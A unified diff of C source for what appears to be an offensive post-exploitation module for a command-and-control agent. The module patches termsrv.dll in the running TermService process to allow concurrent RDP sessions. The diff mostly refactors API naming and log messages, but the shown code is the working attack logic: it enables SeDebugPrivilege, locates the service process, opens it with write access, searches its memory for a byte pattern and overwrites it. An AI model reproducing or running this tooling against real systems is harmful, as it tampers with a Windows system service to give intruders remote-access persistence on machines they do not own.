@@ -3,24 +3,10 @@
 #include <tlhelp32.h>
 #include <psapi.h>
 
+#include "definitions.h"
 #include "badger_exports.h"
 
 // TODO: Add credits to original code
-
-WINADVAPI WINAPI HMODULE Kernel32$GetModuleHandleA(LPCSTR lpModuleName);
-WINADVAPI WINAPI FARPROC Kernel32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
-WINADVAPI WINAPI HANDLE Kernel32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
-WINADVAPI WINAPI BOOL Kernel32$Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
-WINADVAPI WINAPI BOOL Kernel32$Module32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
-WINADVAPI WINAPI BOOL Kernel32$CloseHandle(HANDLE hObject);
-WINADVAPI WINAPI BOOL Kernel32$Module32Next(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
-WINADVAPI WINAPI BOOL Kernel32$Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
-WINADVAPI WINAPI HANDLE Kernel32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
-WINADVAPI WINAPI SIZE_T Kernel32$VirtualQueryEx(HANDLE hProcess,LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,SIZE_T dwLength);
-WINADVAPI WINAPI DWORD Kernel32$GetLastError();
-WINADVAPI WINAPI BOOL Kernel32$ReadProcessMemory(HANDLE hProcess,LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
-WINADVAPI WINAPI BOOL Kernel32$VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-WINADVAPI WINAPI BOOL Kernel32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
 
 typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
 
@@ -82,7 +68,7 @@ PATCH_GENERIC TermSrvMultiRdpReferences[] = {
 BOOL PatchMemory(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T region_size, BYTE *pattern, SIZE_T patternSize, BYTE *patch, SIZE_T patchSize, LONG offset) {
     BYTE *buffer = (BYTE *)BadgerAlloc(region_size);
     if (!buffer) {
-        BadgerDispatch(g_dispatch, "[!] Memory allocation failed\n");
+        BadgerDispatch(g_dispatch, "[-] Memory allocation failed\n");
         return FALSE;
     }
 
@@ -93,8 +79,8 @@ BOOL PatchMemory(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T region_size, BYTE
     BadgerDispatch(g_dispatch, "\r\n");
 
     SIZE_T bytesRead = 0;
-    if (!Kernel32$ReadProcessMemory(hProcess, lpBaseAddress, buffer, region_size, &bytesRead) || bytesRead != region_size) {
-        BadgerDispatch(g_dispatch, "[!] Failed to read memory from process\n");
+    if (!KERNEL32$ReadProcessMemory(hProcess, lpBaseAddress, buffer, region_size, &bytesRead) || bytesRead != region_size) {
+        BadgerDispatch(g_dispatch, "[-] Failed to read memory from process\n");
         BadgerFree((PVOID*)&buffer);
         return FALSE;
     }
@@ -102,7 +88,7 @@ BOOL PatchMemory(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T region_size, BYTE
     BadgerDispatch(g_dispatch, "[*] Read %zu bytes from process\n", bytesRead);
 
     for (SIZE_T i = 0; i <= region_size - patternSize; i++) {
-        if (memcmp(buffer + i, pattern, patternSize) != 0) {
+        if (MSVCRT$memcmp(buffer + i, pattern, patternSize) != 0) {
             continue;
         }
 
@@ -111,24 +97,25 @@ BOOL PatchMemory(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T region_size, BYTE
         LPVOID patchAddress = (LPBYTE)lpBaseAddress + i + offset;
         DWORD oldProtect = 0;
 
-        if (!Kernel32$VirtualProtectEx(hProcess, patchAddress, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-            BadgerDispatch(g_dispatch, "[!] Failed to change memory protection\n");
+        if (!KERNEL32$VirtualProtectEx(hProcess, patchAddress, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+            BadgerDispatch(g_dispatch, "[-] Failed to change memory protection\n");
             break;
         }
 
         BadgerDispatch(g_dispatch, "[+] Patched memory permissions\n");
 
         SIZE_T bytesWritten = 0;
-        BOOL writeResult = Kernel32$WriteProcessMemory(hProcess, patchAddress, patch, patchSize, &bytesWritten);
-        Kernel32$VirtualProtectEx(hProcess, patchAddress, patchSize, oldProtect, &oldProtect);
+        BOOL writeResult = KERNEL32$WriteProcessMemory(hProcess, patchAddress, patch, patchSize, &bytesWritten);
+        KERNEL32$VirtualProtectEx(hProcess, patchAddress, patchSize, oldProtect, &oldProtect);
         BadgerDispatch(g_dispatch, "[+] Restored memory permissions\n");
 
         if (!writeResult || bytesWritten != patchSize) {
-            BadgerDispatch(g_dispatch, "[!] Failed to write patch to memory\n");
+            BadgerDispatch(g_dispatch, "[-] Failed to write patch to memory\n");
             break;
         }
 
         BadgerDispatch(g_dispatch, "[+] Patched process memory\n");
+
         BadgerFree((PVOID*)&buffer);
         return TRUE;
       }
@@ -154,22 +141,22 @@ PATCH_GENERIC *GetPatchGenericFromBuild(PATCH_GENERIC *generics, SIZE_T cbGeneri
 dll_info *get_dll_info(const char *dll_name) {
     dll_info *dll = BadgerAlloc(sizeof(dll_info));
     if (!dll) {
-        BadgerDispatch(g_dispatch, "[!] Error allocating memory for dll_info.\n");
+        BadgerDispatch(g_dispatch, "[-] Error allocating memory for dll_info.\n");
         return NULL;
     }
 
-    HANDLE hProcessSnap = Kernel32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    HANDLE hProcessSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
-        BadgerDispatch(g_dispatch, "[!] Error calling CreateToolhelp32Snapshot.\n");
+        BadgerDispatch(g_dispatch, "[-] Error calling CreateToolhelp32Snapshot.\n");
         return NULL;
     }
 
     PROCESSENTRY32 pe32 = {0};
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
-    if (!Kernel32$Process32First(hProcessSnap, &pe32)) {
-        BadgerDispatch(g_dispatch, "[!] Error calling Process32First().\n");
-        Kernel32$CloseHandle(hProcessSnap);
+    if (!KERNEL32$Process32First(hProcessSnap, &pe32)) {
+        BadgerDispatch(g_dispatch, "[-] Error calling Process32First().\n");
+        KERNEL32$CloseHandle(hProcessSnap);
         return NULL;
     }
 
@@ -178,18 +165,18 @@ dll_info *get_dll_info(const char *dll_name) {
         continue;
         }
 
-        HANDLE hModuleSnap = Kernel32$CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
+        HANDLE hModuleSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
         if (hModuleSnap == INVALID_HANDLE_VALUE) {
-            BadgerDispatch(g_dispatch, "[!] Error calling CreateToolhelp32Snapshot (%d).\n", pe32.th32ProcessID);
+            BadgerDispatch(g_dispatch, "[-] Error calling CreateToolhelp32Snapshot (%d).\n", pe32.th32ProcessID);
             continue;
         }
 
         MODULEENTRY32 me32 = {0};
         me32.dwSize = sizeof(MODULEENTRY32);
 
-        if (!Kernel32$Module32First(hModuleSnap, &me32)) {
-            BadgerDispatch(g_dispatch, "[!] Error calling Module32First().\n");
-            Kernel32$CloseHandle(hModuleSnap);
+        if (!KERNEL32$Module32First(hModuleSnap, &me32)) {
+            BadgerDispatch(g_dispatch, "[-] Error calling Module32First().\n");
+            KERNEL32$CloseHandle(hModuleSnap);
             continue;
         }
 
@@ -198,28 +185,28 @@ dll_info *get_dll_info(const char *dll_name) {
                 dll->pid = pe32.th32ProcessID;
                 dll->dll_addr = me32.modBaseAddr;
                 dll->dll_size = me32.modBaseSize;
-                Kernel32$CloseHandle(hModuleSnap);
-                Kernel32$CloseHandle(hProcessSnap);
+                KERNEL32$CloseHandle(hModuleSnap);
+                KERNEL32$CloseHandle(hProcessSnap);
                 return dll;
             }
-        } while (Kernel32$Module32Next(hModuleSnap, &me32));
+        } while (KERNEL32$Module32Next(hModuleSnap, &me32));
 
-        Kernel32$CloseHandle(hModuleSnap);
+        KERNEL32$CloseHandle(hModuleSnap);
 
-    } while (Kernel32$Process32Next(hProcessSnap, &pe32));
+    } while (KERNEL32$Process32Next(hProcessSnap, &pe32));
 
-    Kernel32$CloseHandle(hProcessSnap);
+    KERNEL32$CloseHandle(hProcessSnap);
     return NULL;
 }
 
 
 int GetWindowsBuildNumber() {
-    HMODULE hMod = Kernel32$GetModuleHandleA("ntdll.dll");
+    HMODULE hMod = KERNEL32$GetModuleHandleA("ntdll.dll");
     if (!hMod) {
         return -1;
     }
 
-    RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)Kernel32$GetProcAddress(hMod, "RtlGetVersion");
+    RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)KERNEL32$GetProcAddress(hMod, "RtlGetVersion");
     if (!pRtlGetVersion) {
         return -2;
     }
@@ -241,7 +228,7 @@ BOOL PatchTermService(PATCH_GENERIC *generics, SIZE_T cbGenerics, PCWSTR moduleN
 
     PATCH_GENERIC *currentReferences = GetPatchGenericFromBuild(generics, cbGenerics, buildNumber);
     if (!currentReferences) {
-        BadgerDispatch(g_dispatch, "[!] No patch references found for build number %lu\n", buildNumber);
+        BadgerDispatch(g_dispatch, "[-] No patch references found for build number %lu\n", buildNumber);
         return FALSE;
     }
 
@@ -249,16 +236,17 @@ BOOL PatchTermService(PATCH_GENERIC *generics, SIZE_T cbGenerics, PCWSTR moduleN
 
     dll_info *termsrv = get_dll_info("termsrv.dll");
     if (!termsrv) {
-        BadgerDispatch(g_dispatch, "[!] Failed to get termsrv.dll info.\n");
+        BadgerDispatch(g_dispatch, "[-] Failed to get termsrv.dll info.\n");
         return FALSE;
     }
 
     DWORD processId = termsrv->pid;
     BadgerDispatch(g_dispatch, "[+] Found TermService with PID %lu\n", processId);
 
-    HANDLE hProcess = Kernel32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, processId);
+
+    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, processId);
     if (!hProcess) {
-        BadgerDispatch(g_dispatch, "[!] OpenProcess failed with error %lu\n", Kernel32$GetLastError());
+        BadgerDispatch(g_dispatch, "[-] OpenProcess failed with error %lu\n", KERNEL32$GetLastError());
         BadgerFree((PVOID*)&termsrv);
         return FALSE;
     }
@@ -271,9 +259,9 @@ BOOL PatchTermService(PATCH_GENERIC *generics, SIZE_T cbGenerics, PCWSTR moduleN
 
     MEMORY_BASIC_INFORMATION mbi;
     for (LPBYTE address = (LPBYTE)baseAddress; address < (LPBYTE)baseAddress + imageSize; address += mbi.RegionSize) {
-        if (Kernel32$VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != sizeof(mbi)) {
-        BadgerDispatch(g_dispatch, "[!] VirtualQueryEx failed at address %p with error %lu\n", address, Kernel32$GetLastError());
-        continue;
+        if (KERNEL32$VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != sizeof(mbi)) {
+            BadgerDispatch(g_dispatch, "[-] VirtualQueryEx failed at address %p with error %lu\n", address, KERNEL32$GetLastError());
+            continue;
         }
 
         if (mbi.State != MEM_COMMIT) {
@@ -286,6 +274,8 @@ BOOL PatchTermService(PATCH_GENERIC *generics, SIZE_T cbGenerics, PCWSTR moduleN
 
         BadgerDispatch(g_dispatch, "[*] Checking memory region at address %p, size: %zu\n", address, mbi.RegionSize);
 
+        
+
         if (PatchMemory(
         hProcess,
         address,
@@ -294,16 +284,15 @@ BOOL PatchTermService(PATCH_GENERIC *generics, SIZE_T cbGenerics, PCWSTR moduleN
         currentReferences->Search.Length,
         currentReferences->Patch.Pattern,
         currentReferences->Patch.Length,
-        currentReferences->Offsets.off0)) {
-
+        currentReferences->Offsets.off0)) {            
             BadgerDispatch(g_dispatch, "[+] \"%ls\" service patched at address %p\n", moduleName, address);
-            Kernel32$CloseHandle(hProcess);
+            KERNEL32$CloseHandle(hProcess);
             BadgerFree((PVOID*)&termsrv);
             return TRUE;
         }
     }
 
-    Kernel32$CloseHandle(hProcess);
+    KERNEL32$CloseHandle(hProcess);
     BadgerFree((PVOID*)&termsrv);
     return FALSE;
 }
@@ -313,11 +302,12 @@ void coffee(char ** argv, int argc, WCHAR** dispatch) {
     g_dispatch = dispatch;
 
     if (!BadgerAddPrivilege(SE_DEBUG_NAME)) {
-        BadgerDispatch(g_dispatch, "[!] Failed to activate SeDebugPrivilege\n");
+        BadgerDispatch(g_dispatch, "[-] Failed to activate SeDebugPrivilege\n");
+        return;
     }
 
     if (!PatchTermService(TermSrvMultiRdpReferences, ARRAYSIZE(TermSrvMultiRdpReferences), L"termsrv.dll")) {
-        printf("[-] Failed to patch service\n");
+        BadgerDispatch(g_dispatch, "[-] Failed to patch service\n");
     }
 }
 
